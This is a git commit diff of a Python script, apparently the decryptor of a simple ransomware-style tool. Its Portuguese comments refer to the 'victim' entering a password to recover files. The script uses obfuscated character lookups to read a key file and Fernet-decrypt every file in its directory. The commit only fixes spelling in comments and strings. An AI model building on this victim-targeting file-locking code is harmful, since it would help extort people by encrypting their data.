ffdcbd3abe45bc978c82b8ad024029b277ffc657
TuciraTeam <53110905+Tunes-scrit@users.noreply.github.com>
2022-05-25 02:48:27 +0100

    Update d_criptfile.py

--- d_criptfile.py
+++ d_criptfile.py
@@ -1,7 +1,6 @@
 #! /usr/bin/env python3
 
-#Esta ferramenta serve para criptografar/decriptografar os ficheiros existentes no diretório, onde o ficheiro deste script se encontra!!
-#Testado no Sistema: Linux
+#Esta ferramenta serve para criptografar/descriptografar os ficheiros existentes no diretório, onde o ficheiro deste script se encontra!!
 #Autor: TuciraTeam
 #Ano: 2022
 
@@ -28,20 +27,20 @@ for file in os.listdir():
     if os.path.isfile(file): 
        s05.append(file) 
        
-# ACÇÃO PARA LER A CHAVE CRIPTOGRAFICA GURDADA NUM FICHEIRO
+# ACÇÃO PARA LER A CHAVE CRIPTOGRAFADA GUARDADA NUM FICHEIRO
 
 with open(a[27]+a[20]+a[8]+a[5]+a[11]+a[5]+a[25]+a[27]+a[11]+a[5]+a[25], a[18]+a[2]) as key: 
         secretkey = key.read()
         
-# AÇÃO PARA CRIAR UMA PASSWORD, POR FORMA A QUE ESTA, QUANDO FOR ESCRITA PELA VITIMA, ACIONE A ACÇÃO QUE VAI DECRIPTOGRAFAR OS FICHEIROS E/OU PASTAS EXISTENTES NA VARIVEL s05
+# AÇÃO PARA CRIAR UMA PASSWORD, POR FORMA A QUE ESTA, QUANDO FOR ESCRITA PELA VITIMA, ACIONE A ACÇÃO QUE VAI DESCRIPTOGRAFAR OS FICHEIROS E/OU PASTAS EXISTENTES NA VARIVEL s05
 
 s04 = a[35]+"6070d4bf934fb"+a[31]+"d4b06d9e2c46e346944e3224"+a[35]+"4900a435d7d9a95e6d7435f"+a[36] #-------> Devem alterar o hash-sha256 da password que querem utilizar (neste exemplo a password é teste)
-s03 = getpass.getpass("\nDigite a Password para Decriptar os Ficheiros\n") 
+s03 = getpass.getpass("\nDigite a Password para Descriptografar os Ficheiros\n") 
 s02 = hashlib.sha256(s03.encode())
 
 if s02.hexdigest() == s04: 
 
-# ACÇÃO QUE VAI DECRIPTOGRAFAR OS FICHEIROS E/OU PASTAS EXISTENTES NA VARIVEL s05 COM A CHAVE CRIPTOGRAFICA GUARDADA NUM FICHEIRO
+# ACÇÃO QUE VAI DESCRIPTOGRAFAR OS FICHEIROS E/OU PASTAS EXISTENTES NA VARIVEL s05 COM A CHAVE CRIPTOGRAFADA GUARDADA NUM FICHEIRO
 
         for file in s05: 
                 with open(file, a[18]+a[2]) as thefile: 
@@ -49,7 +48,7 @@ if s02.hexdigest() == s04:
                 contents_decrypted = Fernet(secretkey).decrypt(contents) 
                 with open(file, a[23]+a[2]) as thefile:
                         thefile.write(contents_decrypted) 
-                print('\033[32m'+"Ficheiro:", file,"----> decriptografado"+'\033[0;0m')
+                print('\033[32m'+"Ficheiro:", file,"----> Descriptografado"+'\033[0;0m')
                
 else:
     	print("\nDesculpa, Password Errada...Tenta de Novo!")
